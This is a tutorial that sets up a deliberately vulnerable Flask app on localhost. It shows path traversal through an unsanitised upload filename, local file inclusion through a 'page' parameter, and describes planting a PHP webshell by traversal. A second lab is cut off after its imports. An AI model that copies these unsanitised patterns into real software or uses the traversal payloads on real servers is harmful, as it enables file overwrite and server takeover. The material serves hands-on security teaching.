### ✅ Step-by-Step Simulation (Real & Safe Lab)#### 🟢 Step 1: Set Up a Vulnerable App1. Create a folder and open terminal in it:mkdir traversal-lfi-lab && cd traversal-lfi-lab2. Install Flask: pip install flask3. Create a file named app.py with the following code:python<br>from flask import Flask, request, send_file<br>import os<br>app = Flask(__name__)
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route("/")
def home():
 return '''<form method="post" enctype="multipart/form-data" action="/upload">
<input type="file" name="file"><input type="submit"></form>'''

@app.route("/upload", methods=["POST"])
def upload():
 f = request.files['file']
 fname = f.filename # ❌ vulnerable - no sanitization
 f.save(os.path.join(UPLOAD_DIR, fname))
 return f"File saved as: {fname}"

@app.route("/view")
def view():
 filename = request.args.get("page") # ❌ vulnerable - used directly
 return send_file(filename)

app.run(port=5000)
#### 🟢 Step 2: Run Apppython app.py✅ Web app starts on: http://localhost:5000#### 🟢 Step 3: Upload a Normal FileGo to homepage → upload a text file like hello.txtIt gets saved inside uploads/#### 🟢 Step 4: Simulate Path Traversal Attack1. Rename your text file to ../../evil.txt2. In terminal:bash<br>curl -F "file=@hello.txt;filename=../../evil.txt" http://localhost:5000/upload<br>✅ The file gets written outside the uploads folderCheck:cat evil.txtYou’ll see your uploaded file in the base directory!#### 🟢 Step 5: Exploit LFINow visit:http://localhost:5000/view?page=../../evil.txt✅ The app includes the file using user-supplied path = LFI#### 🟢 Step 6: Simulate Real-World Attack- Suppose the web server lets you upload .php files- You upload shell.php with filename ../../../var/www/html/admin.php- Server saves your payload in admin.php = remote code execution---### ❗️ Notes:• In many real cases, this led to full takeover of servers• Websites were defaced or their source code leaked• Misconfigured NGINX/PHP/Node apps are especially vulnerable

### ✅ Step-by-Step Simulation in Your Own Safe Lab---### 🟢 Step 1: Create Vulnerable Flask Appbash<br>mkdir path-api-lab && cd path-api-lab<br>pip install flask<br>Create app.py:python<br>from flask import Flask, send_file<br>import os<br>app = Flask(__name__)
